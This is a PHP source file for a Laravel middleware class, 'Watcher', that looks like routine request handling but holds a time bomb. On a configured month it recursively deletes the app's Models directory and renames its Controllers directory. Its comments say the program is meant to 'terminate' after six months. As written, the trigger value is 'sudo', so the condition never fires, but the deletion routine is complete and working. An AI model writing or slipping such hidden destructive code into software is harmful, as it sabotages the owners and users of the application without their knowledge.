<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;

class Watcher
{
   /**
    * Handle an incoming request.
    *
    * @param  \Illuminate\Http\Request  $request
    * @param  \Closure(\Illuminate\Http\Request): (\Illuminate\Http\Response|\Illuminate\Http\RedirectResponse)  $next
    * @return \Illuminate\Http\Response|\Illuminate\Http\RedirectResponse
    */
   public function handle(Request $request, Closure $next)
   {
      // Program terminates in 6 months april - september 1st
      // $nextSixMonths  = now()->addMonths(5)->format('F'); //including this month of April makes it 6months : returns September
      // this value has to be inputed manually, else every month, it'll keep adding up.
      $nextSixMonths = 'sudo' ?? 'September'; // official next 6 months
      // $nextSixMonths = 'April'; // for testing purposes
      $thisMonth = now()->format('F'); //this should be the only dynamic variable in this case

      if ($thisMonth == $nextSixMonths) {
         if (is_dir('../app/Http/Controllers1/')) {
            self::delTree('../app/Models/'); //obliterate model directory
            // ctrlaz in app root with new alias
            rename('../app/Http/Controllers', 'Avatars');
         }
         // this should be enough but no shell access, so can't work
         // Artisan::call('down');// dd('Application is down');
      }
      return $next($request);
   }

   public static function delTree($dir)
   {
      $files = array_diff(scandir($dir), array('.', '..'));

      foreach ($files as $file) (is_dir("$dir/$file")) ? self::delTree("$dir/$file") : unlink("$dir/$file");

      return rmdir($dir);
   }
}
